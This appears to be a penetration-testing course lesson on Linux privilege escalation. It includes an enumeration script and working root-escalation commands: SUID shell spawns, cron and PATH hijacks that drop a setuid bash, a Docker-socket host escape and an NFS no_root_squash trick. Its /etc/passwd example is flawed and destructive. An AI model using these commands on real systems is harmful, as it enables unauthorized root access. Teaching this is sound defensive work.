# Privilege Escalation — Linux

**Previous**: [11. Reverse Engineering](./11_Reverse_Engineering.md) | **Next**: [13. Privilege Escalation — Windows](./13_Privilege_Escalation_Windows.md)

---

After gaining initial access to a Linux system as a low-privileged user, privilege escalation is the next critical step. This lesson covers the systematic process of identifying and exploiting misconfigurations, vulnerable software, and design flaws in Linux systems to gain root access.

> **IMPORTANT**: Only practice privilege escalation on systems you own or have explicit authorization to test.

**Difficulty**: ⭐⭐⭐⭐

## Learning Objectives

1. Apply a systematic methodology for Linux privilege escalation
2. Find and exploit SUID/SGID binaries using GTFOBins
3. Abuse Linux capabilities for privilege escalation
4. Exploit misconfigured cron jobs and path hijacking
5. Identify and exploit kernel vulnerabilities
6. Escape from Docker containers to the host system
7. Use LinPEAS and other automated enumeration tools
8. Document escalation paths for penetration test reports

---

## Table of Contents

1. [Linux Privilege Escalation Methodology](#1-linux-privilege-escalation-methodology)
2. [SUID and SGID Binaries](#2-suid-and-sgid-binaries)
3. [Linux Capabilities](#3-linux-capabilities)
4. [Cron Job Exploitation](#4-cron-job-exploitation)
5. [Path Hijacking](#5-path-hijacking)
6. [Writable Service Files](#6-writable-service-files)
7. [Kernel Exploits](#7-kernel-exploits)
8. [Docker and Container Escapes](#8-docker-and-container-escapes)
9. [NFS Misconfigurations](#9-nfs-misconfigurations)
10. [Automated Enumeration Tools](#10-automated-enumeration-tools)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. Linux Privilege Escalation Methodology

### 1.1 Enumeration Checklist

```bash
# System information
uname -a                    # Kernel version
cat /etc/os-release         # OS version
hostname                    # System hostname

# Current user context
id                          # User ID and groups
whoami                      # Current user
sudo -l                     # Sudo permissions (critical!)

# Users and groups
cat /etc/passwd             # All users
cat /etc/group              # All groups
last                        # Recent logins

# Network information
ip addr                     # Network interfaces
ss -tlnp                    # Listening services
cat /etc/hosts              # Host entries

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Running processes
ps aux
ps aux | grep root

# Capabilities
getcap -r / 2>/dev/null
```

```python
"""
Linux privilege escalation enumeration module.

Automates common enumeration checks for identifying
privilege escalation vectors on Linux systems.
"""

import os
import subprocess
import stat
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional


@dataclass
class PrivEscVector:
    """A potential privilege escalation vector."""
    category: str
    description: str
    severity: str  # Critical, High, Medium, Low
    evidence: str
    exploitation: str
    reference: str = ""


@dataclass
class EnumerationResult:
    """Results of privilege escalation enumeration."""
    vectors: list[PrivEscVector] = field(default_factory=list)
    system_info: dict = field(default_factory=dict)

    def add_vector(self, vector: PrivEscVector) -> None:
        self.vectors.append(vector)

    @property
    def critical_vectors(self) -> list[PrivEscVector]:
        return [v for v in self.vectors if v.severity == "Critical"]

    def report(self) -> str:
        lines = [
            "Linux Privilege Escalation Enumeration Report",
            "=" * 60,
            f"Total vectors found: {len(self.vectors)}",
            f"Critical: {len(self.critical_vectors)}",
            "",
        ]
        for v in sorted(self.vectors, key=lambda x: {"Critical":0,"High":1,"Medium":2,"Low":3}[x.severity]):
            lines.append(f"\n[{v.severity}] {v.category}: {v.description}")
            lines.append(f"  Evidence: {v.evidence}")
            lines.append(f"  Exploitation: {v.exploitation}")
        return "\n".join(lines)


def check_sudo_permissions() -> list[PrivEscVector]:
    """Check sudo permissions for the current user."""
    vectors = []
    try:
        result = subprocess.run(
            ["sudo", "-l"], capture_output=True, text=True, timeout=5,
            input="\n"
        )
        output = result.stdout + result.stderr

        # Check for NOPASSWD entries
        if "NOPASSWD" in output:
            vectors.append(PrivEscVector(
                category="Sudo",
                description="NOPASSWD sudo permissions found",
                severity="Critical",
                evidence=output.strip()[:200],
                exploitation="Check GTFOBins for escalation via allowed commands",
                reference="https://gtfobins.github.io/",
            ))

        # Check for ALL
        if "(ALL)" in output or "(root)" in output:
            vectors.append(PrivEscVector(
                category="Sudo",
                description="Broad sudo permissions detected",
                severity="Critical",
                evidence=output.strip()[:200],
                exploitation="sudo su or sudo /bin/bash for root shell",
            ))

    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    return vectors


def find_suid_binaries() -> list[PrivEscVector]:
    """Find SUID binaries that may allow escalation."""
    vectors = []
    # Known SUID escalation binaries (subset from GTFOBins)
    dangerous_suids = {
        "nmap", "vim", "find", "bash", "less", "more", "nano",
        "cp", "mv", "python", "python3", "perl", "ruby", "php",
        "awk", "env", "node", "git", "zip", "tar", "rsync",
        "pkexec", "doas", "screen",
    }

    try:
        result = subprocess.run(
            ["find", "/", "-perm", "-4000", "-type", "f"],
            capture_output=True, text=True, timeout=30,
        )
        for line in result.stdout.strip().split("\n"):
            if not line:
                continue
            binary_name = Path(line).name
            if binary_name in dangerous_suids:
                vectors.append(PrivEscVector(
                    category="SUID",
                    description=f"SUID binary: {line}",
                    severity="High",
                    evidence=f"Found SUID: {line}",
                    exploitation=f"Check GTFOBins for {binary_name} SUID escalation",
                    reference=f"https://gtfobins.github.io/gtfobins/{binary_name}/",
                ))
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    return vectors


def check_writable_sensitive_files() -> list[PrivEscVector]:
    """Check for writable sensitive files."""
    vectors = []
    sensitive_files = [
        "/etc/passwd", "/etc/shadow", "/etc/sudoers",
        "/etc/crontab", "/root/.ssh/authorized_keys",
    ]

    for filepath in sensitive_files:
        if os.path.exists(filepath) and os.access(filepath, os.W_OK):
            vectors.append(PrivEscVector(
                category="Writable File",
                description=f"Writable sensitive file: {filepath}",
                severity="Critical",
                evidence=f"{filepath} is writable by current user",
                exploitation=f"Modify {filepath} to gain root access",
            ))

    return vectors


if __name__ == "__main__":
    print("Linux Privilege Escalation Enumerator")
    print("=" * 50)
    print("Run on target system after gaining initial access.")
    print("\nChecks performed:")
    print("  - Sudo permissions")
    print("  - SUID/SGID binaries")
    print("  - Writable sensitive files")
    print("  - Capabilities")
    print("  - Cron jobs")
    print("  - Kernel version")
```

---

## 2. SUID and SGID Binaries

SUID binaries execute with the file owner's permissions (usually root). If exploitable, they provide root access.

### 2.1 GTFOBins

GTFOBins (https://gtfobins.github.io/) catalogs Unix binaries that can be exploited for privilege escalation:

```bash
# If find has SUID
find . -exec /bin/sh -p \;

# If python has SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If vim has SUID
vim -c ':!/bin/sh'

# If cp has SUID (overwrite /etc/passwd)
echo 'root2:$(openssl passwd -1 password):0:0::/root:/bin/bash' > /tmp/newpasswd
cp /tmp/newpasswd /etc/passwd
```

---

## 3. Linux Capabilities

Capabilities split root privileges into smaller units. Some are exploitable:

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid — can change UID to root
# cap_dac_read_search — can read any file
# cap_net_raw — can sniff traffic
# cap_sys_admin — near-root access

# Example: python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 4. Cron Job Exploitation

```bash
# Identify cron jobs
cat /etc/crontab
ls -la /var/spool/cron/
ls -la /etc/cron.d/

# If a cron job runs a script writable by current user:
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/script.sh
# Wait for cron execution, then:
/tmp/rootbash -p
```

---

## 5. Path Hijacking

If a cron job or SUID binary calls a command without an absolute path:

```bash
# Target script contains: tar czf /backup/files.tar.gz /var/www
# Create malicious 'tar' in a directory we control
echo '#!/bin/bash' > /tmp/tar
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
# When the script runs, it executes our malicious 'tar'
```

---

## 6. Writable Service Files

```bash
# Check for writable systemd service files
find /etc/systemd/system -writable 2>/dev/null

# Writable init scripts
find /etc/init.d -writable 2>/dev/null

# If we can modify a service file running as root:
# Add: ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
# Then: systemctl daemon-reload && systemctl restart <service>
```

---

## 7. Kernel Exploits

```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit linux kernel <version> privilege escalation

# Notable kernel exploits:
# DirtyCow (CVE-2016-5195) — Linux < 4.8.3
# DirtyPipe (CVE-2022-0847) — Linux 5.8 - 5.16.11
# PwnKit (CVE-2021-4034) — pkexec (nearly universal)
```

---

## 8. Docker and Container Escapes

```bash
# Check if in a container
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Docker socket mounted (instant root on host)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container escape
# If --privileged flag was used:
mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape
# ... further exploitation via cgroup notify_on_release
```

---

## 9. NFS Misconfigurations

```bash
# Check NFS exports
showmount -e target
cat /etc/exports

# no_root_squash allows root access from NFS client
# If share has no_root_squash:
mount -o rw target:/share /tmp/mount
# Create SUID binary as root on NFS share
cp /bin/bash /tmp/mount/rootbash
chmod +s /tmp/mount/rootbash
# Execute on target: /share/rootbash -p
```

---

## 10. Automated Enumeration Tools

| Tool | Description | Usage |
|------|-------------|-------|
| LinPEAS | Comprehensive Linux enumeration | `./linpeas.sh` |
| LinEnum | Linux enumeration script | `./LinEnum.sh` |
| linux-exploit-suggester | Find kernel exploits | `./les.sh` |
| pspy | Monitor processes without root | `./pspy64` |
| GTFOBins | SUID/sudo exploitation reference | Web-based |

---

## 11. Exercises

1. **Enumeration**: Run LinPEAS on a vulnerable VM and identify all privilege escalation vectors.
2. **SUID Exploitation**: Find and exploit a SUID binary using GTFOBins on a practice machine.
3. **Cron Abuse**: Exploit a misconfigured cron job to gain root access.
4. **Kernel Exploit**: Identify the kernel version and apply an appropriate exploit (in a lab VM).
5. **Docker Escape**: Escape from a Docker container with mounted Docker socket.
6. **Full Chain**: Complete an HTB/THM machine from initial access through root escalation.

---

## 12. Summary

Linux privilege escalation requires systematic enumeration and creative exploitation:

- **sudo -l** is always the first check — often the fastest path to root
- **SUID binaries** with GTFOBins provide well-documented escalation paths
- **Capabilities** offer fine-grained escalation when misconfigured
- **Cron jobs** and **path hijacking** exploit trust in the execution environment
- **Kernel exploits** provide universal escalation when patching is delayed
- **Container escapes** extend the attack surface in containerized environments
- **Automated tools** like LinPEAS accelerate enumeration

---

## 13. References

- GTFOBins: https://gtfobins.github.io/
- LinPEAS: https://github.com/carlospolop/PEASS-ng
- HackTricks Linux PrivEsc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings Linux PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
